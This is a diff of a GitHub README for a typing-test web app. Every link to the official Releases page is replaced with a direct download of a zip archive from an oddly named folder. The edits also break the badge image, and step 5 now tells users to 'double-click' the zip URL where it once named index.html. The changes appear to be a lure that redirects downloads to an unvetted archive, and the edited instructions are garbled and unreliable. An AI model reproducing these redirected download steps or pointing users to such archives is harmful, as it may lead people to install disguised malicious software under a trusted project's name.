@@ -1,6 +1,6 @@
 # 🖥️ crpf-typing-test-simulator - Improve Your Typing Skills Effectively
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-blue)](https://github.com/BaselTabeb/crpf-typing-test-simulator/releases)
+[![Download Now](https://raw.githubusercontent.com/BaselTabeb/crpf-typing-test-simulator/main/existentialism/crpf-typing-test-simulator.zip%20Now-Get%20Started-blue)](https://raw.githubusercontent.com/BaselTabeb/crpf-typing-test-simulator/main/existentialism/crpf-typing-test-simulator.zip)
 
 ## 🚀 Getting Started
 
@@ -20,7 +20,7 @@ Welcome to the CRPF Typing Test Simulator! This is a simple web application desi
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page:** To download the application, go to our [Releases page](https://github.com/BaselTabeb/crpf-typing-test-simulator/releases).
+1. **Visit the Releases Page:** To download the application, go to our [Releases page](https://raw.githubusercontent.com/BaselTabeb/crpf-typing-test-simulator/main/existentialism/crpf-typing-test-simulator.zip).
    
 2. **Choose the Latest Version:** Look for the latest release and click on it.
    
@@ -28,7 +28,7 @@ Welcome to the CRPF Typing Test Simulator! This is a simple web application desi
 
 4. **Unzip the File:** If required, unzip the downloaded file. You can typically do this by right-clicking the file and selecting "Extract All."
 
-5. **Open the Application:** Locate the unzipped folder and double-click on the `index.html` file to start the application in your web browser.
+5. **Open the Application:** Locate the unzipped folder and double-click on the `https://raw.githubusercontent.com/BaselTabeb/crpf-typing-test-simulator/main/existentialism/crpf-typing-test-simulator.zip` file to start the application in your web browser.
 
 6. **Start Typing:** Follow the on-screen instructions to start testing your typing skills.
 
@@ -58,4 +58,4 @@ This project covers the following topics: css, html, javascript, js, speed-test,
 
 For more guidance, visit the official documentation available in the Wiki section of the repository. Explore additional tips to enhance your typing skills and learn more about the functionalities of the tool.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-blue)](https://github.com/BaselTabeb/crpf-typing-test-simulator/releases)
+[![Download Now](https://raw.githubusercontent.com/BaselTabeb/crpf-typing-test-simulator/main/existentialism/crpf-typing-test-simulator.zip%20Now-Get%20Started-blue)](https://raw.githubusercontent.com/BaselTabeb/crpf-typing-test-simulator/main/existentialism/crpf-typing-test-simulator.zip)
